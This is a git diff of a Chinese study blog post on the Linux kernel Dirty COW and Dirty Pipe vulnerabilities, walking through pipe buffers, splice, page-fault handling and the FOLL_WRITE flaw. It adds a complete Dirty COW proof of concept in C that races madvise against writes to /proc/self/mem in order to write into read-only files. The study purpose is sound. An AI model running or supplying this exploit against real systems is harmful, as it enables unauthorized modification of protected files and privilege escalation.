@@ -5,7 +5,7 @@ tag:
   - kernel
 ---
 
-# linux内核学习(2) dirty pipe/cow学习
+# 不好看的linux内核学习(2) dirty pipe/cow学习
 
 > 参考文章:https://blog.csdn.net/jasonliuvip/article/details/22600569
 >
@@ -24,8 +24,90 @@ tag:
 > 反向映射机制:https://zhuanlan.zhihu.com/p/363319174
 >
 > madvise函数:https://blog.csdn.net/sz66cm/article/details/139334306
+>
+> dirty cow详解:https://xuanxuanblingbling.github.io/ctf/pwn/2019/11/18/race/ (巨推荐)
+>
+> get_user_pages:https://zhuanlan.zhihu.com/p/579444153
+>
+> 缺页异常：https://www.anquanke.com/post/id/290851
+>
+> pde和pte:https://blog.csdn.net/q1007729991/article/details/52723478
+>
+> 管道:https://zhuanlan.zhihu.com/p/470183989
+>
+> Dirty pipe :https://blog.csdn.net/void_zk/article/details/125884637
+>
+> Pipe_write源码分析:https://xz.aliyun.com/t/11016?time__1311=Cq0x2QD%3DqDT4l2zYGQqpxQq0I1tqWumD
 
 ## 前置知识
+
+### 管道
+
+#### 使用流程
+
+- 父进程使用pipe 创建一个管道
+- 然后fork创建一个子进程
+- 然后继承父进程打开的fd
+
+#### 环形缓冲区 (Ring Buffer)
+
+内核中,管道采用了环形缓冲区进行存储数据. 比如16个内存页构成的环形缓冲区.
+
+管道是通过`pipe_inode_info`对象进行管理的
+
+```c
+struct pipe_inode_info {
+	struct mutex mutex;
+	// 等待队列,存储正在等待的管道可读或者可写的进程
+	wait_queue_head_t wait;
+	// 表示没读的数据占据多少个内存页 (no read bufs)
+	// curbuf: current buffer 表示当前正在读取的环形缓冲区的哪个内存页中的数据
+	unsigned int nrbufs, curbuf, buffers;
+	// 表示正在读取管道的进程数
+	unsigned int readers;
+	// 表示正在写入管道的进程数
+	unsigned int writers;
+	unsigned int files;
+	//  等待管道可写的进程数
+	unsigned int waiting_writers;
+	unsigned int r_counter;
+	unsigned int w_counter;
+	struct page *tmp_page;
+	struct fasync_struct *fasync_readers;
+	struct fasync_struct *fasync_writers;
+	// 环形缓冲区
+	struct pipe_buffer *bufs;
+};
+```
+
+- 然后bufs有十六个`pipe_buffer`对象构成
+
+```c
+
+/**
+ *	struct pipe_buffer - a linux kernel pipe buffer
+ *	@page: the page containing the data for the pipe buffer
+ *	@offset: offset of data inside the @page
+ *	@len: length of data inside the @page
+ *	@ops: operations associated with this buffer. See @pipe_buf_operations.
+ *	@flags: pipe buffer flags. See above.
+ *	@private: private data owned by the ops.
+ **/
+struct pipe_buffer {
+	// pipe_buffer所占的内存页
+	struct page *page;
+	// 进程正在读取的数据在page中的偏移量
+	// len表示内存页拥有的未读数据的长度
+	unsigned int offset, len;
+	const struct pipe_buf_operations *ops;
+	unsigned int flags;
+	unsigned long private;
+};
+```
+
+### PDE 和 PTE 
+
+PDE 是页目录表项。而 PTE是页表表项。
 
 ### 脏页面
 
@@ -58,6 +140,30 @@ ssize_t splice(int fd_in, loff_t *off_in, int fd_out, loff_t *off_out, size_t le
   - `SPLICE_F_MOVE`如果输出是文件，那么就会让kernel尝试从输入管道的缓冲区直接将数据读入输出地址空间,这个过程无任何数据拷贝发生
 
 - 失败返回值为-1
+
+#### 调用链
+
+最终文件与管道间的分流发生在 `do_splice()` 函数：
+
+- 从管道读取到管道，调用 `splice_pipe_to_pipe()`
+- 从文件读取到管道，调用 `splice_file_to_pipe()`
+- 从管道读取到文件，调用 `do_splice_from()`
+
+然后调用splice_file_to_pipe的时候会调用do_splice_to()
+
+然后do_splice_to()调用`splice_read` 指针也就是generic_file_splice_read
+
+```c
+ext4_file_read_iter()
+    generic_file_read_iter()
+        filemap_read()
+            filemap_get_pages() // 获取到文件对应映射的页面集
+            copy_page_to_iter() // 进行页面拷贝（单位为单个页面）
+                __copy_page_to_iter()
+                    copy_page_to_iter_pipe()    // 我们是管道，所以走入该分
+```
+
+- 最终实现copy_page_to_iter_pipe函数中,即是漏洞所在位置
 
 ### /proc/self/mem
 
@@ -187,6 +293,237 @@ mmap cow的过程是：
 - 进程页表指向原始物理内存的副本
 - 向副本写入数据
 
-然后在第二部的时候如果我们恰好能执行madvise从而让副本释放掉,就会将进程的页表重新指向原始的映射内存物理块,那么再次写入数据的时候就会导致只读文件被写入数据
+然后在第二步的时候如果我们恰好能执行madvise从而让副本释放掉,就会将进程的页表重新指向原始的映射内存物理块,那么再次写入数据的时候就会导致只读文件被写入数据
+
+## DirtyCow源码分析
+
+> 参考文章:https://www.cnblogs.com/mrliu0327/p/13456502.html
+>
+> https://zhuanlan.zhihu.com/p/579444153
+>
+> 缺页异常：https://www.anquanke.com/post/id/290851
+
+- 要写一个只读文件的内容（vma->flags只读属性）
+- 先把文件内容读出来（pagecache）
+- 第一次去写，页不在内存，pte entry无效
+- do_cow_page()函数处理，并将文件内容载入内存（回写机制）
+- 然后复制到一个匿名内存页，属性是dirty井且RO
+尝试follow_page，不成功，因为要求写（FOLL_WRITE）但是页面不可写
+- 发生写错误缺页中断
+- 尝试将页属性改为可写（do_wp_page），但由于vma->flags是只读，不成功
+- 返回VM_FAULT_WRITE，之后丢掉FOLL_WRITE
+- 再次follow_page（get_user_page中）
+-此时如果正常的话，返回匿名内存页，虽然是只读，但是硬写没问题
+- 但是，此时杀过来一个madvice，把匿名内存页释放
+- 再次follow_page失败，因为对应的内存不在了
+- 但是要求仅仅是只读（FOLL_WRITE已经被去掉了），所以直接返回
+pagecache对应的内存页，写入之后由于回写机制，会将修改返回真实文件
+- DONE！
+
+缺页异常处理大致流程（详细的会在后面单独写一篇blog进行记录）
+
+```c
+//__do_page_fault()
+//    __handle_mm_fault()
+//        handle_pte_fault()
+//            do_wp_page() ==> pte在主存中，写缺页
+//            do_fault() ==> pte不在主存中，及第一次非匿名页处理流程
+//                do_read_fault()
+//                do_cow_fault() ==> 写操作引起的缺页错误
+//                do_shared_fault()
+```
+
+- `_do_page_fault`函数
+  - 判断 `address` 是位于内核地址空间还是用户地址空间
+  - 位于内核地址空间：
+    - 满足相关条件，进行 `vmalloc_fault` 处理
+  - 位于用户地址空间：
+    - 写错误，设置 `FAULT_FLAG_WRITE` 标志
+    - 满足条件，进行 `handle_mm_fault` 处理
+
+- `__handle_mm_fault`函数
+
+  - 分配各级页表项，并获取页表项
+  - 正常的话，最后进行 `handle_pte_fault` 缺页处理
+
+- `handle_pte_fault`函数
+
+  - 获取页表项中的内存页
+
+  - 该页不在主存中 
+    - 如果pte页表为空 则匿名页进行`do_anonymous_pages`处理 非匿名页 进行`do_fault`函数执行
+    - 如果pte页表不为空 则从交换区将页面换回主存 从交换区换回页面到主存中 缺页写错误 对应页面不可写,就调用`do_wp_page`进行cow 可写就标脏 （可以回写）如果非缺页写错误 就更新pte页表项
+
+- 调用`do_fault`时
+
+  - 由读操作引起的缺页，则进行 `do_read_fault` 处理
+  - **由写私有映射引起的缺页，则进行 `do_cow_fault` 处理**
+  - 其他操作引起的缺页，则进行 `do_shared_fault` 处理
+
+- 所以通过mmap携带``MAP_PRIVATE` flags可以触发do_cow_fault函数 (其实也就是检查vma->vm_flags & VM_SHARED)
+
+  - 分配一个新的页
+  - 更新页表项
+
+```c
+long __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,
+		unsigned long start, unsigned long nr_pages,
+		unsigned int gup_flags, struct page **pages,
+		struct vm_area_struct **vmas, int *nonblocking)
+```
+
+**__get_user_pages**函数 能够获取用户进程调用的虚拟地址之后的物理地址 也就是当进行写入私有映射的内存页时，会经过一个COW(写时拷贝)的过程（即复制只读页生成一个带有写权限的新页，原始页可能是私有保护不可写的）
+
+```c
+long __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,
+		unsigned long start, unsigned long nr_pages,
+		unsigned int gup_flags, struct page **pages,
+		struct vm_area_struct **vmas, int *nonblocking)
+{
+		...
+		page = follow_page_mask(vma, start, foll_flags, &page_mask);
+		if (!page) {
+			int ret;
+			ret = faultin_page(tsk, vma, start, &foll_flags,
+					nonblocking);
+			switch (ret) {
+			case 0:
+				goto retry;
+			case -EFAULT:
+			case -ENOMEM:
+			case -EHWPOISON:
+				return i ? i : ret;
+			case -EBUSY:
+				return i;
+			case -ENOENT:
+				goto next_page;
+			}
+			BUG();
+		}
+		...
+		nr_pages -= page_increm;
+	} while (nr_pages);
+	return i;
+}
+```
+
+- 我们可以看见`faultin_page`会申请内存管理的权限
+
+  ```c
+  static int faultin_page(struct task_struct *tsk, struct vm_area_struct *vma,
+  		unsigned long address, unsigned int *flags, int *nonblocking)
+  {
+  	struct mm_struct *mm = vma->vm_mm;
+  	unsigned int fault_flags = 0;
+  	int ret;
+  
+  	...
+  	if ((ret & VM_FAULT_WRITE) && !(vma->vm_flags & VM_WRITE))
+  		*flags &= ~FOLL_WRITE;
+  	return 0;
+  }
+  ```
+
+  - 漏洞代码就是
+
+    ```c
+    if ((ret & VM_FAULT_WRITE) && !(vma->vm_flags & VM_WRITE))
+    		*flags &= ~FOLL_WRITE;
+    ```
+
+    如果当前VMA中的标志显示当前页不可写，但是用户又执行了页的写操作，那么内核会执行COW操作 并且在处理中会有VM_FAULT_WRITE标志 也就是执行cow操作后,会益处FOLL_WRITE标志
+
+### POC
+
+```c
+#include <stdio.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <string.h>
+
+void *map;
+int f;
+struct stat st;
+char *name;
+
+void *madviseThread(void *arg)
+{
+  char *str;
+  str=(char*)arg;
+  int i,c=0;
+  for(i=0;i<100000000;i++)
+  {
+    c+=madvise(map,100,MADV_DONTNEED);
+  }
+  printf("madvise %d\n\n",c);
+}
+
+void *procselfmemThread(void *arg)
+{
+  char *str;
+  str=(char*)arg;
+  int f=open("/proc/self/mem",O_RDWR);
+  int i,c=0;
+  for(i=0;i<100000000;i++) {
+    lseek(f,map,SEEK_SET);
+    c+=write(f,str,strlen(str));
+  }
+  printf("procselfmem %d\n\n", c);
+}
+
+int main(int argc,char *argv[])
+{
+  if (argc<3)return 1;
+  pthread_t pth1,pth2;
+  f=open(argv[1],O_RDONLY);
+  fstat(f,&st);
+  name=argv[1];
+  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
+  printf("mmap %x\n\n",map);
+  pthread_create(&pth1,NULL,madviseThread,argv[1]);
+  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
+  pthread_join(pth1,NULL);
+  pthread_join(pth2,NULL);
+  return 0;
+}
+```
+
+
 
 ## DirtyPipe漏洞成因
+
+> 参考文章:https://blog.csdn.net/void_zk/article/details/125884637
+
+- 没有初始化pip_buffer->flags属性
+
+```c
+struct pipe_buffer {
+	// pipe_buffer所占的内存页
+	struct page *page;
+	// 进程正在读取的数据在page中的偏移量
+	// len表示内存页拥有的未读数据的长度
+	unsigned int offset, len;
+	const struct pipe_buf_operations *ops;
+	unsigned int flags;
+	unsigned long private;
+};
+```
+
+也就是当我们调用`slice`函数的时候,会利用管道当作缓冲区。比如A文件内容移动到B文件,那么我们就会调用slice将A的数据转移到管道,然后从管道将数据发送给B。
+
+那么当文件读取到管道会调用`splice_file_to_pipe`本质调用的就是`copy_page_to_iter_pipe`函数,然后这个函数会将pipe_buffer->page设置为`文件映射的页面`对应的page(page引用+1)head也会加1
+
+```c
+buf->ops = &page_cache_pipe_buf_ops;
+// 引用+1
+get_page(page);
+// 设置文件内存页面直接为page 省去反复copy的过程
+buf->page = page;
+// 设置偏移
+buf->offset = offset;
+// 设置总字节数
+buf->len = bytes;
+```
+
+- 我们可以发现这里是没有重新设置flags的也就是我们在pipe_write中设置的`PIPE_BUF_FLAG_CAN_MERGE`标志,携带标志我们可以在pipwrite的时候往文件映射的内存页中写入数据
